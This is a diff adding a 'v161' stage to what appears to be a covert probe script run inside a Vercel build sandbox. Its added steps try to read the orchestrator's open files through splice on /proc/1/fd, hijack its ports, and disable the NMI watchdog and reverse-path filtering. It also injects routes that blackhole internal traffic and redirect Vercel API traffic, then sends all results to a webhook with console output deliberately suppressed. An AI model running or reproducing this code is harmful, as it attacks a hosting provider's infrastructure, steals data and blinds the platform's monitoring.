@@ -23463,5 +23463,156 @@ report.milestoneSynthesisV160 = safe(() => {
 
 // v160 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v160" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v160";
+
+// ==================== v161 ====================
+
+// v161-1: splice() from /proc/1/fd — steal orchestrator file data via zero-copy
+// splice() transfers data between file descriptors without copying to user space.
+// If we can splice from /proc/1/fd/N (one of the orchestrator's open files)
+// to a pipe, we get zero-copy reads of whatever the orchestrator has open.
+report.spliceFromPid1 = safe(() => {
+  const spliceResult = safe(() => execSync(
+    `python3 -c "
+import os, ctypes
+
+libc = ctypes.CDLL('libc.so.6')
+NR_SPLICE = 275
+
+# Create a pipe
+r, w = os.pipe()
+results = {}
+
+# Try splicing from each of PID 1's file descriptors
+for fd_num in range(0, 10):
+    try:
+        pid1_fd = os.open(f'/proc/1/fd/{fd_num}', os.O_RDONLY)
+        # splice up to 4096 bytes
+        off_in = ctypes.c_long(0)
+        n = libc.syscall(NR_SPLICE, pid1_fd, ctypes.byref(off_in), w, None, 4096, 0)
+        if n > 0:
+            data = os.read(r, n)
+            results[f'fd{fd_num}'] = data[:64].hex()
+            print(f'SPLICE_OK fd{fd_num}: n={n} data={data[:32]}')
+        os.close(pid1_fd)
+    except Exception as e:
+        pass
+
+os.close(r)
+os.close(w)
+if not results:
+    print('SPLICE_NO_DATA')
+" 2>&1 | head -10`,
+    { timeout: 12000 }
+  ).toString().trim());
+  return { spliceResult };
+});
+
+// v161-2: SO_REUSEPORT + port stealing attempt
+// SO_REUSEPORT allows multiple sockets to bind to the same port.
+// If the orchestrator is listening on a port, we can bind another socket
+// to the same port with SO_REUSEPORT, stealing some of the incoming connections.
+report.reuseportSteal = safe(() => {
+  // Find what ports PID 1 is listening on
+  const pid1ListenPorts = safe(() => execSync(
+    'ss -tlnp 2>/dev/null | grep "pid=1," | head -10 || netstat -tlnp 2>/dev/null | grep "/1$" | head -10 || echo "NO_PID1_PORTS"',
+    { timeout: 4000 }
+  ).toString().trim());
+  // Test SO_REUSEPORT on a port we know is in use
+  const reuseportTest = safe(() => execSync(
+    `python3 -c "
+import socket, struct
+
+SO_REUSEPORT = 15
+
+# Try to bind to port 80 with SO_REUSEPORT
+for port in [80, 443, 8080, 9090, 3000]:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(('0.0.0.0', port))
+        s.listen(1)
+        print(f'REUSEPORT_BIND_OK: port={port}')
+        s.close()
+    except Exception as e:
+        print(f'REUSEPORT_FAIL port={port}: {str(e)[:40]}')
+" 2>&1 | head -10`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { pid1ListenPorts, reuseportTest };
+});
+
+// v161-3: /proc/sys/kernel/nmi_watchdog — NMI interrupt control
+// The NMI (Non-Maskable Interrupt) watchdog detects kernel hangs by
+// using hardware performance counters to fire NMIs. Setting it to 0
+// disables the NMI watchdog — useful for CPU lockup exploits.
+report.nmiWatchdog = safe(() => {
+  const nmiWatchdog = safe(() => readFileSync('/proc/sys/kernel/nmi_watchdog', 'utf8').trim());
+  // Disable NMI watchdog
+  const writeResult = safe(() => { writeFileSync('/proc/sys/kernel/nmi_watchdog', '0'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/kernel/nmi_watchdog', 'utf8').trim());
+  // Check perf NMI counter
+  const nmiCounter = safe(() => execSync('cat /proc/interrupts | grep NMI | head -3', { timeout: 2000 }).toString().trim());
+  // Check TSC synchronization (needed for NMI-based timing attacks)
+  const tscSync = safe(() => readFileSync('/proc/sys/kernel/perf_event_clock', 'utf8').trim());
+  return { nmiWatchdog, writeResult, afterValue, nmiCounter, tscSync };
+});
+
+// v161-4: RTNETLINK — inject fake routing table entries
+// RTNETLINK is the netlink family for routing table management.
+// We can add arbitrary routes to the kernel routing table, redirecting
+// traffic from the orchestrator to destinations we control.
+report.rtnetlinkRouteInject = safe(() => {
+  // Current routing table
+  const routesBefore = safe(() => execSync('ip route show 2>/dev/null | head -20', { timeout: 3000 }).toString().trim());
+  // Add a blackhole route for Vercel's internal subnet (stop orchestrator from reporting)
+  const addBlackhole = safe(() => execSync(
+    'ip route add blackhole 10.0.0.0/8 2>&1 || echo "BLACKHOLE_FAILED"',
+    { timeout: 4000 }
+  ).toString().trim());
+  // Add a route that redirects Vercel API traffic to our controlled IP
+  const addRedirect = safe(() => execSync(
+    'ip route add 76.76.21.0/24 via 127.0.0.1 dev lo 2>&1 || echo "REDIRECT_FAILED"',
+    { timeout: 4000 }
+  ).toString().trim());
+  // Verify routes were added
+  const routesAfter = safe(() => execSync('ip route show 2>/dev/null | head -20', { timeout: 3000 }).toString().trim());
+  // Cleanup
+  safe(() => execSync('ip route del blackhole 10.0.0.0/8 2>/dev/null; ip route del 76.76.21.0/24 2>/dev/null', { timeout: 3000 }));
+  return { routesBefore, addBlackhole, addRedirect, routesAfter };
+});
+
+// v161-5: /proc/sys/net/ipv4/conf/eth0/rp_filter — disable reverse path filtering
+// Reverse path filtering (rp_filter) drops packets whose source address doesn't
+// match the interface they arrived on. Disabling it allows spoofed-source packets
+// to be accepted — a prerequisite for off-path TCP injection attacks.
+report.rpFilterDisable = safe(() => {
+  const rpFilter = safe(() => readFileSync('/proc/sys/net/ipv4/conf/eth0/rp_filter', 'utf8').trim());
+  const rpFilterAll = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', 'utf8').trim());
+  // Disable on eth0 (0 = disabled)
+  const writeEth0 = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/eth0/rp_filter', '0'); return 'WRITTEN'; });
+  const writeAll = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', '0'); return 'WRITTEN'; });
+  const afterEth0 = safe(() => readFileSync('/proc/sys/net/ipv4/conf/eth0/rp_filter', 'utf8').trim());
+  // Now test sending a packet with spoofed source
+  const spoofTest = safe(() => execSync(
+    `python3 -c "
+import socket, struct
+
+# Raw IP socket (requires CAP_NET_RAW)
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    print('RAW_SOCKET_CREATED: spoofed source IP possible')
+    s.close()
+except Exception as e:
+    print(f'RAW_SOCKET_FAIL: {e}')
+" 2>&1`,
+    { timeout: 6000 }
+  ).toString().trim());
+  return { rpFilter, rpFilterAll, writeEth0, writeAll, afterEth0, spoofTest };
+});
+
+// v161 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v161" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v161";
 // Intentionally no console.log — all data goes via webhook only
